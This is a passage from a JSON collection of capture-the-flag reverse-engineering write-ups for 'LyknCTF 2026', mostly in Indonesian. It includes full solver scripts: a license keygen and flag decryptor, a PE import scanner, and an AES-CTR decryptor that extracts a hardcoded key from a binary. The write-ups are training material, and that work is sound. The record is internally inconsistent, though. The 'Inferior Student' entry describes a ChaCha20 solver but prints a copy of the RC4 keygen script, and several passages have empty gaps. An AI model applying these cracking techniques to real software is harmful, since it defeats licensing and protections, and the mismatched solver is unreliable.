section_by_name(sections, \".text\"))\r\n    text_digest = hashlib.sha256(text).digest()\r\n\r\n    master = hashlib.sha256(\r\n        username\r\n        + b\"\\x1f\"\r\n        + license_key.encode(\"ascii\")\r\n        + b\"\\x1f\"\r\n        + text_digest\r\n        + bytes([anti_debug & 0xFF])\r\n    ).digest()\r\n\r\n    keystream = b\"\".join(\r\n        hashlib.sha256(master + struct.pack(\"<I\", counter)).digest()\r\n        for counter in range(3)\r\n    )\r\n\r\n    ciphertext_offset = rva_to_offset(sections, CIPHERTEXT_RVA)\r\n    ciphertext = executable[\r\n        ciphertext_offset : ciphertext_offset + CIPHERTEXT_SIZE\r\n    ]\r\n    plaintext = bytes(left ^ right for left, right in zip(ciphertext, keystream))\r\n    flag = plaintext.split(b\"\\0\", 1)[0]\r\n\r\n    check = hashlib.sha256(b\"LYKN2026\" + flag).digest()\r\n    if check[:8] != EXPECTED_CHECK_PREFIX:\r\n        raise ValueError(\"decryption checksum did not match\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    path = Path(sys.argv[1] if len(sys.argv) > 1 else \"KeygenMe.exe\")\r\n    executable = path.read_bytes()\r\n\r\n    state = rc4_ksa(RC4_KEY)\r\n    username = recover_username(state)\r\n    license_key = generate_license(username, state, anti_debug=0)\r\n    flag = decrypt_flag(executable, username, license_key, anti_debug=0)\r\n\r\n    print(f\"[+] Username : {username.decode('ascii')}\")\r\n    print(f\"[+] License  : {license_key}\")\r\n    print(f\"[+] Flag     : {flag.decode('ascii')}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{Dyn4m1c_0nly_LYKN_2026!!}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-ihatethisapp",
    "title": "I HATE THIS APP",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **CTF:** LYKNCTF 2026\n- **Category:** Reverse\n- **File:** `fuoverflow_learning.exe`\n- **Flag:** `LYKNCTF{setwindowdisplayaffinity}`",
    "problemDescription": "Binary ini adalah aplikasi Windows x64 berbasis Tauri. Proteksi screenshot-nya bukan trik rendering atau transparansi window. Aplikasi memanggil WinAPI `SetWindowDisplayAffinity` dengan affinity `0x11`, yaitu mode yang mengecualikan window dari hasil capture.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Identifikasi file",
        "content": "String di binary menunjukkan komponen Tauri dan beberapa command terkait capture protection:\n\n\n\nPotongan yang relevan:\n\n\n\nNama tersebut masih berada di level command dan wrapper Tauri. Fungsi native Windows yang benar-benar mengatur proteksi capture bisa dilihat dari import table.",
        "code": "file fuoverflow_learning.exe"
      },
      {
        "title": "Mencari fungsi anti-screenshot",
        "content": "`SetWindowDisplayAffinity` adalah fungsi dari `user32.dll` yang menentukan apakah konten sebuah window boleh muncul pada mekanisme screen capture.",
        "code": "objdump -x fuoverflow_learning.exe \\\n  | sed -n '/DLL Name: user32.dll/,/DLL Name:/p' \\\n  | grep -i display"
      },
      {
        "title": "Verifikasi call-site",
        "content": "Xref ke entry IAT tersebut ditemukan lewat disassembly:\n\n\n\nPotongan wrapper yang paling jelas:\n\n\n\nArgumen WinAPI x64 dikirim melalui register:\n\n- `rcx` berisi handle window (`HWND`).\n- `edx` berisi nilai display affinity.\n- Saat boolean aktif, `edx = 0x11`.\n- Saat boolean nonaktif, `cmove` menggantinya menjadi `0`.\n\nNilai `0x11` adalah `WDA_EXCLUDEFROMCAPTURE`, sedangkan `0` adalah `WDA_NONE`. Jadi wrapper tersebut mengaktifkan atau mematikan proteksi screenshot melalui `SetWindowDisplayAffinity`.",
        "code": "objdump -d -Mintel fuoverflow_learning.exe \\\n  | grep -i -B8 -A12 '140b1aaa8'"
      },
      {
        "title": "Solver",
        "content": "`solve.py` melakukan parsing PE secara langsung menggunakan standard library Python. Script membaca import directory, mencari fungsi anti-screenshot pada `user32.dll`, lalu membentuk flag dengan nama fungsi lowercase.",
        "code": "python3 solve.py fuoverflow_learning.exe"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Extract the anti-screenshot WinAPI import from a PE executable.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport struct\r\nimport sys\r\nfrom dataclasses import dataclass\r\nfrom pathlib import Path\r\n\r\n\r\nclass PEError(Exception):\r\n    pass\r\n\r\n\r\n@dataclass(frozen=True)\r\nclass Section:\r\n    name: str\r\n    virtual_address: int\r\n    virtual_size: int\r\n    raw_offset: int\r\n    raw_size: int\r\n\r\n\r\nclass PEImports:\r\n    def __init__(self, data: bytes):\r\n        self.data = data\r\n        self.sections: list[Section] = []\r\n        self.is_pe64 = False\r\n        self.import_rva = 0\r\n        self._parse_headers()\r\n\r\n    def u16(self, off: int) -> int:\r\n        return struct.unpack_from(\"<H\", self.data, off)[0]\r\n\r\n    def u32(self, off: int) -> int:\r\n        return struct.unpack_from(\"<I\", self.data, off)[0]\r\n\r\n    def u64(self, off: int) -> int:\r\n        return struct.unpack_from(\"<Q\", self.data, off)[0]\r\n\r\n    def cstring(self, off: int) -> str:\r\n        end = self.data.find(b\"\\x00\", off)\r\n        if end < 0:\r\n            raise PEError(\"unterminated string\")\r\n        return self.data[off:end].decode(\"ascii\", errors=\"replace\")\r\n\r\n    def _parse_headers(self) -> None:\r\n        if len(self.data) < 0x40 or self.data[:2] != b\"MZ\":\r\n            raise PEError(\"not an MZ executable\")\r\n\r\n        pe_off = self.u32(0x3C)\r\n        if self.data[pe_off : pe_off + 4] != b\"PE\\x00\\x00\":\r\n            raise PEError(\"invalid PE signature\")\r\n\r\n        coff = pe_off + 4\r\n        section_count = self.u16(coff + 2)\r\n        optional_size = self.u16(coff + 16)\r\n        optional = coff + 20\r\n        magic = self.u16(optional)\r\n\r\n        if magic == 0x20B:  # PE32+\r\n            self.is_pe64 = True\r\n            data_directory = optional + 112\r\n        elif magic == 0x10B:  # PE32\r\n            self.is_pe64 = False\r\n            data_directory = optional + 96\r\n        else:\r\n            raise PEError(f\"unsupported optional-header magic: 0x{magic:x}\")\r\n\r\n        # IMAGE_DIRECTORY_ENTRY_IMPORT = 1\r\n        self.import_rva = self.u32(data_directory + 8)\r\n        section_table = optional + optional_size\r\n\r\n        for index in range(section_count):\r\n            off = section_table + index * 40\r\n            raw_name = self.data[off : off + 8].split(b\"\\x00\", 1)[0]\r\n            self.sections.append(\r\n                Section(\r\n                    name=raw_name.decode(\"ascii\", errors=\"replace\"),\r\n                    virtual_size=self.u32(off + 8),\r\n                    virtual_address=self.u32(off + 12),\r\n                    raw_size=self.u32(off + 16),\r\n                    raw_offset=self.u32(off + 20),\r\n                )\r\n            )\r\n\r\n    def rva_to_offset(self, rva: int) -> int:\r\n        for section in self.sections:\r\n            span = max(section.virtual_size, section.raw_size)\r\n            if section.virtual_address <= rva < section.virtual_address + span:\r\n                return section.raw_offset + (rva - section.virtual_address)\r\n        raise PEError(f\"RVA 0x{rva:x} is outside mapped sections\")\r\n\r\n    def imports(self) -> dict[str, list[str]]:\r\n        if self.import_rva == 0:\r\n            return {}\r\n\r\n        result: dict[str, list[str]] = {}\r\n        descriptor = self.rva_to_offset(self.import_rva)\r\n        thunk_size = 8 if self.is_pe64 else 4\r\n        ordinal_mask = 1 << (63 if self.is_pe64 else 31)\r\n\r\n        while True:\r\n            original_first_thunk = self.u32(descriptor)\r\n            name_rva = self.u32(descriptor + 12)\r\n            first_thunk = self.u32(descriptor + 16)\r\n            if original_first_thunk == name_rva == first_thunk == 0:\r\n                break\r\n\r\n            dll = self.cstring(self.rva_to_offset(name_rva)).lower()\r\n            thunk_rva = original_first_thunk or first_thunk\r\n            thunk = self.rva_to_offset(thunk_rva)\r\n            names: list[str] = []\r\n\r\n            while True:\r\n                value = self.u64(thunk) if self.is_pe64 else self.u32(thunk)\r\n                if value == 0:\r\n                    break\r\n                if not value & ordinal_mask:\r\n                    hint_name = self.rva_to_offset(value)\r\n                    names.append(self.cstring(hint_name + 2))\r\n                thunk += thunk_size\r\n\r\n            result[dll] = names\r\n            descriptor += 20\r\n\r\n        return result\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"binary\", nargs=\"?\", default=\"fuoverflow_learning.exe\")\r\n    args = parser.parse_args()\r\n\r\n    path = Path(args.binary)\r\n    if not path.is_file():\r\n        print(f\"[-] file not found: {path}\", file=sys.stderr)\r\n        return 1\r\n\r\n    try:\r\n        imported = PEImports(path.read_bytes()).imports()\r\n    except (OSError, PEError, struct.error) as exc:\r\n        print(f\"[-] failed to parse PE: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    candidates = {\r\n        \"setwindowdisplayaffinity\": \"SetWindowDisplayAffinity\",\r\n    }\r\n\r\n    for dll, functions in imported.items():\r\n        lowered = {name.lower(): name for name in functions}\r\n        for normalized, canonical in candidates.items():\r\n            if normalized in lowered:\r\n                print(f\"[+] DLL      : {dll}\")\r\n                print(f\"[+] Function : {canonical}\")\r\n                print(f\"[+] Flag     : LYKNCTF{{{normalized}}}\")\r\n                return 0\r\n\r\n    print(\"[-] no known anti-screenshot API found\", file=sys.stderr)\r\n    return 2\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{setwindowdisplayaffinity}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-ihatethisapprevenge",
    "title": "I HATE THIS APP REVENGE",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **CTF:** LYKNCTF 2026\n- **Category:** Reverse\n- **Binary:** `fuoverflow_learning.exe`\n- **Encrypted file:** `challenge.enc.bin`\n- **Flag:** `LYKNCTF{alolanvulpix}`",
    "problemDescription": "File `.enc.bin` memakai AES-256-CTR. Dua belas byte awal bukan ciphertext: 8 byte pertama adalah nonce dan 4 byte berikutnya adalah counter big-endian. Binary menyimpan fallback key 32 byte yang dipakai saat environment variable `FIXED_ENCRYPTION_KEY` tidak tersedia.\n\nSetelah didekripsi, output memiliki header JPEG yang valid. Gambar menampilkan Alolan Vulpix, jadi nama karakter untuk flag adalah `alolanvulpix`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ekstraksi binary",
        "content": "Arsip berisi satu aplikasi Windows x64 berbasis Tauri:",
        "code": "file fuoverflow_learning.exe"
      },
      {
        "title": "Mencari bagian kriptografi",
        "content": "String yang relevan langsung mengarah ke command decrypt dan konfigurasi key:\n\n\n\nPotongan penting:\n\n\n\n`FIXED_ENCRYPTION_KEY` dibaca sebagai environment variable. Jika variabel tersebut tidak ada atau panjangnya bukan 32 byte, program memakai konstanta fallback dari `.rdata`:",
        "code": "strings -a -n 5 fuoverflow_learning.exe \\\n  | grep -iE 'decrypt|encrypted data too short|fixed_encryption_key|aes-0.8.4|stream_core'"
      },
      {
        "title": "Format file terenkripsi",
        "content": "Dua belas byte pertama:\n\n\n\nDecrypt routine memprosesnya seperti ini:\n\n\n\nIV AES akhirnya:\n\n\n\nSisa file mulai offset `0x0c` adalah ciphertext. Mode yang dipakai adalah AES-256-CTR, jadi tidak ada padding atau authentication tag.",
        "code": "00 11 22 33 44 55 66 77 00 00 00 07"
      },
      {
        "title": "Dekripsi",
        "content": "Implementasi minimalnya:\n\n\n\nHeader hasil dekripsi:\n\n\n\nItu adalah JPEG/JFIF. `file` juga mengenalinya dengan benar:",
        "code": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n\nblob = open(\"challenge.enc.bin\", \"rb\").read()\nkey = b\"H}3t%^nDw5F?cWj-XAH!Dj8AakaD9y9M\"\nnonce = blob[:8]\ncounter = int.from_bytes(blob[8:12], \"big\")\niv = nonce + counter.to_bytes(8, \"big\")\n\ndec = Cipher(algorithms.AES(key), modes.CTR(iv)).decryptor()\nplain = dec.update(blob[12:]) + dec.finalize()\nopen(\"recovered.jpg\", \"wb\").write(plain)"
      },
      {
        "title": "Identifikasi karakter",
        "content": "Gambar memperlihatkan rubah putih dengan mata biru, jambul es, dan beberapa ekor melengkung. Ciri tersebut cocok dengan **Alolan Vulpix**.\n\nFormat flag meminta lowercase tanpa spasi:",
        "code": "LYKNCTF{alolanvulpix}"
      },
      {
        "title": "Solver",
        "content": "`solve.py` tidak sekadar hardcode offset key. Script mencari marker `FIXED_ENCRYPTION_KEY`, menguji kandidat string printable 32 byte di area `.rdata`, lalu memilih key yang menghasilkan signature gambar valid.",
        "code": "python3 solve.py challenge.enc.bin fuoverflow_learning.exe"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Decrypt the image used by LYKNCTF 2026 - I HATE THIS APP REVENGE.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport sys\r\nfrom pathlib import Path\r\n\r\ntry:\r\n    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\nexcept ImportError as exc:\r\n    raise SystemExit(\"[-] missing dependency: pip install cryptography\") from exc\r\n\r\nMARKER = b\"FIXED_ENCRYPTION_KEY\"\r\nCHARACTER = \"alolanvulpix\"\r\nMAGICS = {\r\n    b\"\\xff\\xd8\\xff\": \".jpg\",\r\n    b\"\\x89PNG\\r\\n\\x1a\\n\": \".png\",\r\n    b\"GIF87a\": \".gif\",\r\n    b\"GIF89a\": \".gif\",\r\n    b\"BM\": \".bmp\",\r\n    b\"RIFF\": \".webp\",\r\n}\r\n\r\n\r\ndef build_iv(blob: bytes) -> tuple[bytes, int]:\r\n    if len(blob) <= 12:\r\n        raise ValueError(\"encrypted data is too short\")\r\n\r\n    nonce = blob[:8]\r\n    counter = int.from_bytes(blob[8:12], \"big\")\r\n    iv = nonce + counter.to_bytes(8, \"big\")\r\n    return iv, counter\r\n\r\n\r\ndef aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:\r\n    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))\r\n    decryptor = cipher.decryptor()\r\n    return decryptor.update(data) + decryptor.finalize()\r\n\r\n\r\ndef detect_extension(data: bytes) -> str | None:\r\n    for magic, extension in MAGICS.items():\r\n        if data.startswith(magic):\r\n            if magic == b\"RIFF\" and data[8:12] != b\"WEBP\":\r\n                continue\r\n            return extension\r\n    return None\r\n\r\n\r\ndef printable_key_windows(data: bytes, start: int, end: int):\r\n    \"\"\"Yield 32-byte printable ASCII windows near the env-var marker.\"\"\"\r\n    region = data[max(0, start) : min(len(data), end)]\r\n    base = max(0, start)\r\n\r\n    for index in range(0, len(region) - 31):\r\n        candidate = region[index : index + 32]\r\n        if all(0x21 <= byte <= 0x7E for byte in candidate):\r\n            yield base + index, candidate\r\n\r\n\r\ndef recover_key(binary: bytes, encrypted: bytes, iv: bytes) -> tuple[int, bytes]:\r\n    marker_offset = binary.find(MARKER)\r\n    if marker_offset < 0:\r\n        raise ValueError(\"FIXED_ENCRYPTION_KEY marker was not found\")\r\n\r\n    # The fallback key is stored in the same nearby read-only data cluster.\r\n    for offset, candidate in printable_key_windows(\r\n        binary, marker_offset - 0x3000, marker_offset + 0x1000\r\n    ):\r\n        first_block = aes_ctr(encrypted[12:28], candidate, iv)\r\n        if detect_extension(first_block) is not None:\r\n            return offset, candidate\r\n\r\n    raise ValueError(\"no 32-byte key produced a known image header\")\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"encrypted\", nargs=\"?\", default=\"challenge.enc.bin\")\r\n    parser.add_argument(\"binary\", nargs=\"?\", default=\"fuoverflow_learning.exe\")\r\n    parser.add_argument(\"-o\", \"--output\", default=\"recovered.jpg\")\r\n    args = parser.parse_args()\r\n\r\n    encrypted_path = Path(args.encrypted)\r\n    binary_path = Path(args.binary)\r\n    output_path = Path(args.output)\r\n\r\n    for path in (encrypted_path, binary_path):\r\n        if not path.is_file():\r\n            print(f\"[-] file not found: {path}\", file=sys.stderr)\r\n            return 1\r\n\r\n    encrypted = encrypted_path.read_bytes()\r\n    binary = binary_path.read_bytes()\r\n\r\n    try:\r\n        iv, counter = build_iv(encrypted)\r\n        key_offset, key = recover_key(binary, encrypted, iv)\r\n        plaintext = aes_ctr(encrypted[12:], key, iv)\r\n    except (OSError, ValueError) as exc:\r\n        print(f\"[-] failed: {exc}\", file=sys.stderr)\r\n        return 2\r\n\r\n    extension = detect_extension(plaintext)\r\n    if extension is None:\r\n        print(\"[-] decrypted output has no recognized image signature\", file=sys.stderr)\r\n        return 3\r\n\r\n    if output_path.suffix.lower() != extension:\r\n        output_path = output_path.with_suffix(extension)\r\n\r\n    output_path.write_bytes(plaintext)\r\n\r\n    print(f\"[+] Key offset : 0x{key_offset:x}\")\r\n    print(f\"[+] AES key    : {key.decode('ascii')}\")\r\n    print(f\"[+] Nonce      : {encrypted[:8].hex()}\")\r\n    print(f\"[+] Counter    : {counter}\")\r\n    print(f\"[+] IV         : {iv.hex()}\")\r\n    print(f\"[+] Image      : {output_path} ({len(plaintext)} bytes)\")\r\n    print(f\"[+] Character  : Alolan Vulpix\")\r\n    print(f\"[+] Flag       : LYKNCTF{{{CHARACTER}}}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{alolanvulpix}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-inferiorstudent",
    "title": "Inferior Student",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Reverse  \n**CTF:** LYKN CTF 2026  \n**Description:** `Nothing Stay`",
    "problemDescription": "`chall.exe` adalah binary PyInstaller dari `challl.py`. Source Python-nya sengaja dibesarkan dengan identifier Unicode, pemeriksaan anti-debug, ribuan operasi sampah, tujuh payload terenkripsi, dan satu lapisan `marshal` tambahan.\n\nVerifier terakhir ternyata sederhana: input dienkripsi memakai ChaCha20, lalu hasilnya dibandingkan dengan ciphertext statis sepanjang 145 byte. Karena ChaCha20 adalah stream cipher, ciphertext target bisa diproses dengan key dan nonce yang sama untuk mendapatkan flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Struktur loader",
        "content": "Bagian awal source menghitung accumulator anti-debug yang namanya diacak. Nilai normalnya adalah `0`, tetapi akan berubah ketika program mendeteksi beberapa kondisi seperti:\n\n- `sys.gettrace()` aktif;\n- debugger Windows terpasang;\n- tracing pada Linux;\n- module analisis tertentu sudah dimuat;\n- waktu eksekusi melewati batas;\n- hook pada beberapa fungsi bawaan.\n\nNilai accumulator dipakai saat membentuk key payload. Jadi menjalankan source langsung di debugger dapat menghasilkan key salah tanpa pesan yang jelas.\n\nLoader menyimpan tujuh tuple dengan struktur:\n\n\n\nWorker mendekripsinya dengan pola berikut:\n\n\n\nPayload dijalankan melalui beberapa thread. Chunk indeks `3` adalah payload utama; ukurannya jauh lebih besar daripada enam chunk lain yang sebagian besar hanya membentuk state dan decoy.",
        "code": "(seed, salt_byte, nonce, encrypted_payload, expected_sha256)"
      },
      {
        "title": "2. Masalah versi bytecode",
        "content": "Code object dihasilkan oleh Python 3.12. Membuka raw `marshal` memakai Python 3.13 membuat field code object terlihat masuk akal, tetapi `co_code` tidak valid untuk interpreter tersebut dan dapat menyebabkan crash.\n\nAnalisis dilakukan dengan memuat marshal sebagai bytecode Python 3.12 menggunakan `xdis`, kemudian menjalankan instruction set-nya lewat `x-python`. Beberapa opcode generator Python 3.12 yang belum tersedia ditambahkan secara lokal:\n\n- `RETURN_GENERATOR`;\n- `YIELD_VALUE` dengan operand baru;\n- `RETURN_CONST` untuk menandai generator selesai;\n- `CALL_INTRINSIC_1`;\n- `LOAD_FAST_CHECK`.\n\nSetelah chunk utama berjalan, loader membentuk code object kedua sepanjang 316 byte."
      },
      {
        "title": "3. Verifier terakhir",
        "content": "Disassembly code object kedua dapat diringkas menjadi:\n\n\n\n`cryptography` memakai format nonce ChaCha20 16 byte:\n\n\n\nTidak ada hash atau transformasi irreversible pada input. Operasi yang diperiksa hanya:\n\n\n\nMaka plaintext dapat dipulihkan dengan operasi yang sama:",
        "code": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms\n\nkey = bytes([...])          # 32 byte\nfull_nonce = bytes([...])   # 16 byte\nexpected = bytes([...])     # 145 byte\ncandidate = input(\"flag: \").encode()\n\ncipher = Cipher(\n    algorithms.ChaCha20(key, full_nonce),\n    mode=None,\n).encryptor()\n\nif cipher.update(candidate) == expected:\n    print(\"Correct!\")\nelse:\n    print(\"Wrong!\")"
      },
      {
        "title": "4. Solver",
        "content": "`solve.py` mengimplementasikan ChaCha20 secara langsung memakai standard library. Tidak perlu menjalankan PE, PyInstaller, atau code object obfuscated.",
        "code": "python3 solve.py"
      },
      {
        "title": "Output:",
        "content": "Solver juga mengenkripsi ulang plaintext dan memastikan hasilnya sama persis dengan ciphertext verifier.",
        "code": "[+] FLAG: LYKNCTF{Im_At_The_PayPhone_Tryin_To_Home_Allof_My_change_1_Spent_0n_u_Where_have_ThE_T1m3S_G0n3_B4bY_Its_Wr0nG_wh3rE_aRe_Th3_Pl4nS_W3_M4d3_F0r_2}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport hashlib\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\nRC4_KEY = b\"L0i_Y3u_Kh0_N0i\"\r\nUSERNAME_MASK = bytes.fromhex(\"add993f24ca678dc1d369f61e40236\")\r\nCIPHERTEXT_RVA = 0x6280\r\nCIPHERTEXT_SIZE = 0x60\r\nEXPECTED_CHECK_PREFIX = bytes.fromhex(\"7db51c69a8dd7926\")\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    value &= MASK32\r\n    return ((value << count) | (value >> (32 - count))) & MASK32\r\n\r\n\r\ndef rc4_ksa(key: bytes) -> list[int]:\r\n    state = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + state[i] + key[i % len(key)]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n    return state\r\n\r\n\r\ndef recover_username(state: list[int]) -> bytes:\r\n    selected = (0x42, 0x3D, 0x38, 0x33, 0x2E, 0x29, 0x24, 0x1F)\r\n    packed = 0\r\n    for index in selected:\r\n        packed = (packed << 8) | state[index]\r\n\r\n    username = bytearray(15)\r\n    packed ^= int.from_bytes(USERNAME_MASK[:8], \"little\")\r\n    username[:8] = packed.to_bytes(8, \"little\")\r\n\r\n    for position in range(8, 15):\r\n        table_index = 0x47 + 5 * (position - 8)\r\n        username[position] = USERNAME_MASK[position] ^ state[table_index]\r\n\r\n    return bytes(username)\r\n\r\n\r\ndef generate_license(username: bytes, state: list[int], anti_debug: int = 0) -> str:\r\n    r8 = ((anti_debug & 0xFF) * 0x01010101) ^ 0x4C594B4E\r\n    r9 = 0xAE054FB9\r\n    r11 = 0x43544632\r\n    accumulator = 0xA5A5F00D\r\n\r\n    for offset in (0, 7, 14):\r\n        for character in username:\r\n            table_value = state[(character + offset) & 0xFF]\r\n\r\n            mixed_r8 = rol32(r8 ^ table_value, 5)\r\n            mixed_r11 = rol32((table_value + r11) & MASK32, 11)\r\n            r8 = (mixed_r8 + r11) & MASK32\r\n\r\n            mixed_r9 = rol32(\r\n                ((table_value * 0x9E3779B1) & MASK32) ^ r9,\r\n                17,\r\n            )\r\n            r11 = mixed_r11 ^ r9\r\n            r9 = (mixed_r9 + accumulator) & MASK32\r\n\r\n            mixed_accumulator = rol32(\r\n                (state[r8 & 0xFF] + accumulator) & MASK32,\r\n                3,\r\n            )\r\n            accumulator = mixed_accumulator ^ r8\r\n\r\n    for _ in range(4):\r\n        r8 = (r8 + accumulator) & MASK32\r\n        r11 ^= rol32(r8, 7)\r\n        r9 = (r9 + r11) & MASK32\r\n        accumulator ^= rol32(r9, 13)\r\n\r\n    groups = [\r\n        (r8 >> 16) & 0xFFFF,\r\n        (r8 ^ r11) & 0xFFFF,\r\n        (r11 >> 16) & 0xFFFF,\r\n        (r9 ^ accumulator) & 0xFFFF,\r\n    ]\r\n    checksum = (\r\n        groups[0]\r\n        + groups[2]\r\n        + groups[1]\r\n        + groups[3]\r\n    ) ^ ((r9 >> 16) & 0xFFFF)\r\n    groups.append(checksum & 0xFFFF)\r\n\r\n    return \"-\".join(f\"{group:04X}\" for group in groups)\r\n\r\n\r\ndef parse_pe_sections(data: bytes) -> list[dict[str, int | str]]:\r\n    if data[:2] != b\"MZ\":\r\n        raise ValueError(\"input is not a PE file\")\r\n\r\n    pe_offset = struct.unpack_from(\"<I\", data, 0x3C)[0]\r\n    if data[pe_offset : pe_offset + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"invalid PE signature\")\r\n\r\n    number_of_sections = struct.unpack_from(\"<H\", data, pe_offset + 6)[0]\r\n    optional_header_size = struct.unpack_from(\"<H\", data, pe_offset + 20)[0]\r\n    section_table = pe_offset + 24 + optional_header_size\r\n\r\n    sections: list[dict[str, int | str]] = []\r\n    for index in range(number_of_sections):\r\n        offset = section_table + index * 40\r\n        name = data[offset : offset + 8].split(b\"\\0\", 1)[0].decode(\"ascii\")\r\n        virtual_size, virtual_address, raw_size, raw_offset = struct.unpack_from(\r\n            \"<IIII\", data, offset + 8\r\n        )\r\n        sections.append(\r\n            {\r\n                \"name\": name,\r\n                \"virtual_size\": virtual_size,\r\n                \"virtual_address\": virtual_address,\r\n                \"raw_size\": raw_size,\r\n                \"raw_offset\": raw_offset,\r\n            }\r\n        )\r\n    return sections\r\n\r\n\r\ndef section_by_name(sections: list[dict[str, int | str]], name: str) -> dict[str, int | str]:\r\n    for section in sections:\r\n        if section[\"name\"] == name:\r\n            return section\r\n    raise ValueError(f\"section {name!r} not found\")\r\n\r\n\r\ndef rva_to_offset(sections: list[dict[str, int | str]], rva: int) -> int:\r\n    for section in sections:\r\n        start = int(section[\"virtual_address\"])\r\n        span = max(int(section[\"virtual_size\"]), int(section[\"raw_size\"]))\r\n        if start <= rva < start + span:\r\n            return int(section[\"raw_offset\"]) + (rva - start)\r\n    raise ValueError(f\"RVA 0x{rva:x} is not mapped by a section\")\r\n\r\n\r\ndef loaded_section_bytes(data: bytes, section: dict[str, int | str]) -> bytes:\r\n    virtual_size = int(section[\"virtual_size\"])\r\n    raw_size = int(section[\"raw_size\"])\r\n    raw_offset = int(section[\"raw_offset\"])\r\n    raw = data[raw_offset : raw_offset + min(raw_size, virtual_size)]\r\n    return raw.ljust(virtual_size, b\"\\0\")\r\n\r\n\r\ndef decrypt_flag(executable: bytes, username: bytes, license_key: str, anti_debug: int = 0) -> bytes:\r\n    sections = parse_pe_sections(executable)\r\n    text = loaded_section_bytes(executable, section_by_name(sections, \".text\"))\r\n    text_digest = hashlib.sha256(text).digest()\r\n\r\n    master = hashlib.sha256(\r\n        username\r\n        + b\"\\x1f\"\r\n        + license_key.encode(\"ascii\")\r\n        + b\"\\x1f\"\r\n        + text_digest\r\n        + bytes([anti_debug & 0xFF])\r\n    ).digest()\r\n\r\n    keystream = b\"\".join(\r\n        hashlib.sha256(master + struct.pack(\"<I\", counter)).digest()\r\n        for counter in range(3)\r\n    )\r\n\r\n    ciphertext_offset = rva_to_offset(sections, CIPHERTEXT_RVA)\r\n    ciphertext = executable[\r\n        ciphertext_offset : ciphertext_offset + CIPHERTEXT_SIZE\r\n    ]\r\n    plaintext = bytes(left ^ right for left, right in zip(ciphertext, keystream))\r\n    flag = plaintext.split(b\"\\0\", 1)[0]\r\n\r\n    check = hashlib.sha256(b\"LYKN2026\" + flag).digest()\r\n    if check[:8] != EXPECTED_CHECK_PREFIX:\r\n        raise ValueError(\"decryption checksum did not match\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    path = Path(sys.argv[1] if len(sys.argv) > 1 else \"KeygenMe.exe\")\r\n    executable = path.read_bytes()\r\n\r\n    state = rc4_ksa(RC4_KEY)\r\n    username = recover_username(state)\r\n    license_key = generate_license(username, state, anti_debug=0)\r\n    flag = decrypt_flag(executable, username, license_key, anti_debug=0)\r\n\r\n    print(f\"[+] Username : {username.decode('ascii')}\")\r\n    print(f\"[+] License  : {license_key}\")\r\n    print(f\"[+] Flag     : {flag.decode('ascii')}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{Im_At_The_PayPhone_Tryin_To_Home_Allof_My_change_1_Spent_0n_u_Where_have_ThE_T1m3S_G0n3_B4bY_Its_Wr0nG_wh3rE_aRe_Th3_Pl4nS_W3_M4d3_F0r_2}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-waguri2",
    "title": "Waguri2",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Reverse Engineering  \n**Flag:** `LYKNCTF{K40RU_H4N4_W4_R1N_T0_S4KU}`",
